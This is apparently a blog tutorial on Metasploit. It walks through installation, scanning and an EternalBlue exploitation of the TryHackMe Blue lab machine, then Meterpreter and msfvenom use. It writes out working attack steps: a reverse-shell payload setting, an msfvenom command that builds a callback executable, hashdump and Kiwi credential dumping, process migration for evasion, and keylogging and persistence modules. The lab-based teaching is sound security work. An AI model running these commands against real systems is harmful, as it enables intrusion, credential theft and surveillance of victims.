## Introduction

Metasploit is one of the most widely used frameworks in the cybersecurity field, adopted by both professional penetration testers and malicious actors. At its core, Metasploit is a platform that allows users to deliver exploits to a target system by taking advantage of already documented vulnerabilities. The process is straightforward: identify an existing vulnerability, locate the exploit designed for it, and send it to the target machine.

It is important to understand that Metasploit does not discover new vulnerabilities on its own. Instead, it automates the exploitation of known, already-documented weaknesses, making the process faster, more structured, and repeatable. This is precisely what makes it such a powerful tool — it bridges the gap between a published vulnerability and a real-world proof of concept.


##### **Using Metasploit**

Metasploit comes pre-installed on operating systems specifically built for cybersecurity work, such as Kali Linux, Parrot OS, and BlackArch. These distributions include the framework by default, along with many of the supporting tools it relies on, making them the recommended environment for running Metasploit.

However, installation is not limited to security-focused distributions. Rapid7 provides official open-source installers for Linux, Windows, and macOS, and the installer ships with all the necessary dependencies, including tools like Nmap and John the Ripper. That said, Windows is generally not the platform of choice for deploying Metasploit, since many of the supporting tools and utilities are not available on that platform  Linux is strongly recommended. 

For those who prefer not to use a dedicated security OS, let's walk through how to install it manually.

```
# 1. Update and upgrade the system packages
sudo apt update && sudo apt upgrade -y

# 2. Install required dependencies
sudo apt install curl gpg gnupg2 postgresql libpq-dev zlib1g-dev \
build-essential libreadline-dev libssl-dev libyaml-dev \
libsqlite3-dev sqlite3 libpcap-dev libffi-dev git -y

# 3. Download and run the official Metasploit installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall \
&& chmod 755 msfinstall \
&& sudo ./msfinstall

# 4. Start and enable PostgreSQL (Metasploit's database)
sudo systemctl start postgresql
sudo systemctl enable postgresql

# 5. Initialize the Metasploit database
msfdb init

# 6. Launch Metasploit
msfconsole
```


After the installation is complete, it is necessary to add Metasploit to the system PATH so that commands like `msfconsole` can be executed from any terminal window without specifying the full path each time.


```bash
# Add Metasploit to the system PATH
echo 'export PATH=/opt/metasploit-framework/bin:$PATH' >> ~/.bashrc

# Apply the changes to the current session
source ~/.bashrc

# Verify the installation was successful
msfconsole --version
```

> **Note:** This step is often overlooked but is essential — without it, the system will not recognize Metasploit commands unless you are already inside the installation directory.

Once inside `msfconsole`, it is recommended to verify whether Metasploit has an active connection to the database. This can be done with the following command:

```bash
db_status
```

<img src="/budahacksecurity/uploads/md_images/meta/msf.png" style="max-width:100%; border-radius:8px;">


If the database is connected, Metasploit will be able to store scan results, discovered hosts, credentials, and session data for later use. If there is no connection, the framework will still work normally  all modules and exploits remain fully functional however, nothing will be saved to the database and all data will be lost once the session is closed.

> **Note:** For demonstration purposes, we used the **Blue** machine available on the TryHackMe platform. This is a beginner-friendly Windows-based room specifically designed to practice exploitation of the EternalBlue vulnerability (MS17-010), making it an ideal controlled environment to apply the concepts covered in this documentation.


## **Navigating Metasploit **

#### **Search**

Metasploit's module library is extensive, and searching by a single keyword will often return an overwhelming number of results. To narrow things down and find a specific exploit efficiently, filters can be combined in a single search query:

```bash
search eternalblue platform:windows type:exploit cve:2017 name:smb
```

<img src="/budahacksecurity/uploads/md_images/meta/msf1.png" style="max-width:100%; border-radius:8px;">
The available search filters include:

| Filter      | Description                                |
| ----------- | ------------------------------------------ |
| `name:`     | Module name or keyword                     |
| `platform:` | Target platform (windows, linux, android…) |
| `type:`     | Module type (exploit, auxiliary, post…)    |
| `cve:`      | CVE year or full CVE ID                    |

#### **Scanners**

Although I do not frequently rely on Metasploit Framework's built-in scanners on a day-to-day basis, they have proven especially useful during pivoting and lateral movement scenarios within compromised networks.

One of the framework's key advantages is its ability to automatically manage traffic routing between sessions, eliminating in many cases the need to manually configure SOCKS proxies, reverse tunnels, or local port redirections. Through auxiliary modules and internal routing capabilities, Metasploit significantly simplifies access to internal network segments during authorized penetration testing engagements.

It is also important to address a fairly common misconception: Metasploit is not solely an exploitation tool. The framework integrates multiple capabilities spanning different phases of an offensive security audit:

- **Auxiliary Modules:** used for reconnaissance and enumeration tasks, such as port scanning, service version identification, fingerprinting, and vulnerability verification — without the need to execute an exploit directly.
- **Payload Generation:** through tools like `msfvenom`, it is possible to create staged and stageless payloads, custom executables, and remote access mechanisms for use in controlled lab environments or authorized testing scenarios.
- **Vulnerability Exploitation:** the framework's core functionality, allowing the execution of public exploits against vulnerable services or systems.
- **Post-Exploitation and Pivoting:** advanced capabilities for privilege escalation, credential harvesting, lateral movement, and access to internal networks through compromised sessions.

This versatility establishes Metasploit as a comprehensive offensive security and penetration testing platform, far beyond being simply an exploit launcher.

**Port Scanning with Metasploit**

To begin the enumeration phase, we used the `auxiliary/scanner/portscan/syn` module to identify open ports on the target machine.

First, we searched for available port scanning modules using the following command:

```
search type:auxiliary name:TCP portscan
```

This returned four scanner modules:

```
#  Name                             Rank    Description
-  ----                             ----    -----------
0  auxiliary/scanner/portscan/xmas  normal  TCP "XMas" Port Scanner
1  auxiliary/scanner/portscan/ack   normal  TCP ACK Firewall Scanner
2  auxiliary/scanner/portscan/tcp   normal  TCP Port Scanner
3  auxiliary/scanner/portscan/syn   normal  TCP SYN Port Scanner
```

A module can be loaded in two ways — by its index number or by its full name:


```bash
use 2
# or
use auxiliary/scanner/portscan/tcp
```

Once the module is loaded, we inspect its configurable options with `show options`:

```
Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in millisec
                                           onds.
   PORTS        1-1000           yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       10.64.187.158    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                           /basics/using-metasploit.html
   THREADS      5                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
```

The most critical parameter here is `RHOSTS`, which defines the target. `PORTS` can be adjusted to narrow or expand the scan range, and `THREADS` can be increased to speed up the process.


To assign values to the module's required fields, we use the `set` command followed by the option name and its value:

<img src="/budahacksecurity/uploads/md_images/meta/msf2.png" style="max-width:100%; border-radius:8px;">

> Alternatively, the `setg` command can be used to set a value globally, so that it persists across all modules during the current session — avoiding the need to redefine it every time a new module is loaded: 

After running the SYN scan, we identified three open ports on the target machine. To gather more information about the services running on those ports, we can use the SMB version detection module:

```
search type:auxiliary name:smb scanner
```

<img src="/budahacksecurity/uploads/md_images/meta/msf3.png" style="max-width:100%; border-radius:8px;">

After running the `smb_version` module, we can observe that the target is running **Windows 7 Professional SP1**, with an SMB version of **2.1** and a hostname of **JON-PC**.

With this information, we already have enough context to move forward with exploitation. However, before launching any exploit, it is good practice to confirm whether the target is actually vulnerable. For this we use the `smb_ms17_010` auxiliary module:

```
use auxiliary/scanner/smb/smb_ms17_010
```

This module checks whether the target system is susceptible to the EternalBlue vulnerability (MS17-010) without executing any exploit giving us a clean confirmation before proceeding.

<img src="/budahacksecurity/uploads/md_images/meta/msf4.png" style="max-width:100%; border-radius:8px;">

#### **Exploitation**

As established earlier, exploits are scripts, techniques, or resources that take advantage of a known vulnerability in a target system. In Metasploit, the syntax for loading and configuring an exploit module follows the same structure as auxiliary modules — however, each exploit is different in nature, as it targets a specific vulnerability and requires its own set of parameters depending on the attack vector involved.

Searching for EternalBlue-related exploit modules returns the following results:
```
search type:exploit name:smb cve:2017 eternalblue

Matching Modules
================

#   Name                                    Disclosure Date  Rank     Check  Description
-   ----                                    ---------------  ----     -----  -----------
0   exploit/windows/smb/ms17_010_eternalblue  2017-03-14    average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
10  exploit/windows/smb/ms17_010_psexec       2017-03-14    normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
19  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14    great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

Before executing the exploit, it is necessary to define a payload — the code that will run on the target machine once the vulnerability has been successfully exploited. In this case we use:

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

The payload acts as the communication bridge between the attacker's machine and the compromised target. In this instance, `reverse_tcp` instructs the target machine to initiate a connection back to the attacker, establishing an interactive Meterpreter session. It is important to select a payload that is compatible with both the target architecture — in this case `x64` — and the exploit being used.

<img src="/budahacksecurity/uploads/md_images/meta/msf5.png" style="max-width:100%; border-radius:8px;">

<img src="/budahacksecurity/uploads/md_images/meta/msf6.png" style="max-width:100%; border-radius:8px;">

For this lab we selected `exploit/windows/smb/ms17_010_eternalblue`, which targets the MS17-010 vulnerability and supports multiple Windows versions including Windows 7, Windows 8, Windows 10, and Windows Server 2008 R2 among others.

After configuring the required parameters and running the exploit, we can observe that it executed successfully and a shell was obtained on the target machine.

If we want to keep the Meterpreter session active in the background without closing it, we simply run the `background` command and confirm with `yes`. The session will remain open and accessible for later use.

To list all active sessions we use:

```
sessions -l
```

To resume a specific session by its ID:

```
sessions -i <ID>
```

<img src="/budahacksecurity/uploads/md_images/meta/msf7.png" style="max-width:100%; border-radius:8px;">


#### **Meterpreter**

Meterpreter is an advanced shell developed specifically for Metasploit. It operates as an extensible payload, meaning it can dynamically load additional functionality to interact with a target machine during authorized security testing engagements.

In certain scenarios, it may employ techniques such as reflective DLL injection and process migration to improve stability and evasion capabilities — although this does not guarantee complete stability across all environments, nor that it will remain undetected by modern security solutions.

For a deeper technical understanding of how staged and stageless Meterpreter payloads work internally, refer to the following official Rapid7 [post_meterpreter](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).


for obtain more info about use the meterpreter we use the `help` commad:

```
help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post 
```

Once the Meterpreter session is established, we can begin enumerating information about the compromised machine. The `sysinfo` command returns basic system details such as the hostname, operating system version, and architecture:

```bash
sysinfo
```

To identify the user context under which Meterpreter is running, we use `getuid`:

```bash
getuid
```

In this case, the output returns `NT AUTHORITY\SYSTEM`, which indicates that the exploit executed directly with maximum privileges — the highest permission level available on a Windows system — without requiring any additional privilege escalation step.

The `hashdump` command extracts the password hashes stored in the Windows SAM database from the compromised system:

```bash
hashdump
```

The output returns user accounts along with their NTLM hashes, which can subsequently be used in offline cracking attacks or pass-the-hash techniques during lateral movement.

<img src="/budahacksecurity/uploads/md_images/meta/msf8.png" style="max-width:100%; border-radius:8px;">

Within the active Meterpreter session, it is possible to migrate from one process to another using the `migrate` command followed by the target process ID. This is useful for improving session stability and avoiding detection, as remaining in the original exploited process can be risky if that process is terminated.

```bash
migrate <PID>
```

<img src="/budahacksecurity/uploads/md_images/meta/msf9.png" style="max-width:100%; border-radius:8px;">

In addition to `hashdump`, we can load the **Kiwi** extension to perform a deeper extraction of system credentials directly from memory:

```bash
load kiwi
creds_all
```

Kiwi, based on Mimikatz, allows us to retrieve NTLM hashes, Kerberos tickets, and in certain configurations, plaintext credentials — providing a more complete picture of the credentials available on the compromised system.

<img src="/budahacksecurity/uploads/md_images/meta/msf10.png" style="max-width:100%; border-radius:8px;">

### **MSFVenom, Payloads and Encoders**

`msfvenom` is the successor to the older Metasploit tools MSFPayload and MSFEncode, combining both functionalities into a single standalone utility within the Metasploit Framework.

Before understanding how `msfvenom` works, it is important to first understand payloads and encoders, since these two components were the foundation from which `msfvenom` originated.

Historically, Metasploit separated payload generation and encoding into two different tools:

- **MSFPayload** — responsible for generating payloads that would execute after a successful exploitation.
- **MSFEncode** — used to encode payloads, primarily to avoid problematic characters and adapt payloads to certain delivery constraints.

Over time, maintaining both tools independently became inefficient. As a result, Metasploit merged their functionality into a single utility:


**Payloads**

A payload is the code executed on the target system after the exploit successfully leverages a vulnerability. The exploit itself only provides the entry point  the payload determines what action will occur once access is achieved.


Examples of actions performed by payloads:

- Opening interactive shells
- Establishing remote sessions
- Running Meterpreter
- Performing post-exploitation tasks

Example payload breakdown:

```
windows/x64/meterpreter/reverse_tcp
```

- `windows` → target operating system
- `x64` → architecture
- `meterpreter` → payload type
- `reverse_tcp` → connection method

**Encoders**

Encoders modify the representation of a payload while preserving its functionality. Their original purpose was **not** antivirus evasion — this is a common misconception. Encoders were primarily designed to:

- Avoid bad characters (`NULL`, line breaks, etc.)
- Adapt payloads to exploit restrictions
- Preserve execution compatibility

One of the best-known encoders in Metasploit is `x86/shikata_ga_nai`, which applies polymorphic transformations to payload instructions while maintaining the same behavior.

However, encoding alone does not guarantee bypassing modern antivirus or EDR solutions, since modern defenses analyze runtime behavior, memory execution, network activity, process injection, and API calls.

**MSFVenom — Syntax and Usage**

The basic syntax of `msfvenom` is the following:

```bash
msfvenom -p <payload> -e <encoder> -f <format> LHOST=<ip> LPORT=<port>
```

|Flag|Description|
|---|---|
|`-p`|Payload to use|
|`-e`|Encoder to apply|
|`-f`|Output format (exe, elf, raw, ps1, etc.)|
|`-a`|Target architecture (x86, x64)|
|`--platform`|Target platform (windows, linux, android, etc.)|
|`LHOST`|Attacker's IP address|
|`LPORT`|Listening port|

To list all available payloads, encoders, formats, platforms and architectures:

```bash
msfvenom -l payloads
msfvenom -l encoders
msfvenom -l formats
```

**Creating a Reverse Shell with MSFVenom**

The following command generates a stageless Meterpreter payload in executable format targeting a Windows x64 system:
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST="192.168.0.4" LPORT=1234 -f exe > example.exe
```

<img src="/budahacksecurity/uploads/md_images/meta/msf15.png" style="max-width:100%; border-radius:8px;">

To receive the incoming connection, we use the `multi/handler` module in msfconsole, configuring it with the same payload, LHOST, and LPORT values used during payload generation.

<img src="/budahacksecurity/uploads/md_images/meta/msf16.png" style="max-width:100%; border-radius:8px;">

<img src="/budahacksecurity/uploads/md_images/meta/msf17.png" style="max-width:100%; border-radius:8px;">
Once the payload is transferred to the Windows 10 machine and executed, an active Meterpreter session is established. From there, we run `getsystem` to attempt privilege escalation to SYSTEM level, and use `screenshot` to capture the current state of the target's screen.

<img src="/budahacksecurity/uploads/md_images/meta/msf18.png" style="max-width:100%; border-radius:8px;">

<img src="/budahacksecurity/uploads/md_images/meta/msf19.png" style="max-width:100%; border-radius:8px;">

It is important to understand that `msfvenom` is not limited to a single platform. It can generate payloads and apply encoders targeting a wide range of operating systems and architectures — from Windows and Linux to macOS, Android, and others — covering both desktop and mobile environments.

However, since Metasploit's payloads are widely known and extensively catalogued, security solutions such as antivirus software, EDR, IDS, and IPS will frequently detect them. This does not mean the payloads are ineffective — it means that in real authorized engagements, additional steps are typically required. Tools and techniques focused on obfuscation and payload packaging exist specifically to reduce the detection surface, though covering those falls outside the scope of this documentation.
### Post-explotation

Once the vulnerability has been successfully exploited and an active Meterpreter session is established, we proceed to the post-exploitation phase. This phase focuses on gathering additional information about the compromised system, maintaining access, and understanding the full scope of what can be reached from the target all within the boundaries of the authorized engagement.

Enumerating logged-on users:
```
run post/windows/gather/enum_logged_on_users 
```

Returns a list of users currently logged on or recently active on the target machine.

<img src="/budahacksecurity/uploads/md_images/meta/msf11.png" style="max-width:100%; border-radius:8px;">

Detecting virtual machine environment:
```
run  post/windows/gather/checkvm
```

Identifies whether the target is running inside a virtual machine — useful for understanding the nature of the environment being tested.

<img src="/budahacksecurity/uploads/md_images/meta/msf12.png" style="max-width:100%; border-radius:8px;">

Enumerating installed applications:
```
run  post/windows/gather/enum_applications
```

Lists all applications installed on the target system, which can reveal additional attack surface or vulnerable software versions.

<img src="/budahacksecurity/uploads/md_images/meta/msf13.png" style="max-width:100%; border-radius:8px;">

**Local Exploit Suggester**

The `local_exploit_suggester` module automatically analyzes the compromised system and identifies potential local privilege escalation vectors based on the target's OS version and architecture:

```
run post/multi/recon/local_exploit_suggester
```

<img src="/budahacksecurity/uploads/md_images/meta/msf14.png" style="max-width:100%; border-radius:8px;">

In this case, the module ran 253 exploit checks against the target — a Windows 7 Service Pack 1 x64 system — and returned multiple viable candidates, including:

- `bypassuac_comhijack` / `bypassuac_eventvwr` — UAC bypass techniques specific to Windows 7 SP1
- `cve_2019_1458_wizardopium` — local privilege escalation via Win32k
- `ms16_075_reflection_juicy` — token impersonation via NTLM reflection
- `exploit/windows/persistence/bits` — persistence via Background Intelligent Transfer Service

This output illustrates how a single unpatched system can expose numerous attack paths beyond the initial entry point, reinforcing the importance of keeping systems updated and properly hardened.


**Additional Post-Exploitation Capabilities**

Beyond credential extraction and privilege escalation, Metasploit includes additional post-exploitation modules that demonstrate the full extent of access an attacker can achieve on a compromised system. These capabilities are relevant to understand from a defensive perspective, as they highlight what an unauthorized actor could do if a system is left unpatched:

- **Persistence** — maintaining access across reboots via modules such as `exploit/windows/persistence/bits`
- **Keylogging** — capturing keystrokes via `keyscan_start` and `keyscan_dump`
- **Webcam and audio** — accessing the target's camera and microphone if available

These capabilities underline why timely patching, network segmentation, and endpoint detection solutions are critical components of any security strategy.

### **References**

- Rapid7. (2015). _Deep Dive Into Stageless Meterpreter Payloads_. Rapid7 Blog. [https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
- Rapid7. (2024). _Metasploit Framework Documentation_. [https://docs.metasploit.com/](https://docs.metasploit.com/)
- Rapid7. _Metasploit Framework — GitHub Repository_. [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
- TryHackMe. _Blue — Room_. [https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)
- Microsoft. (2017). _MS17-010 Security Bulletin — EternalBlue_. [https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)


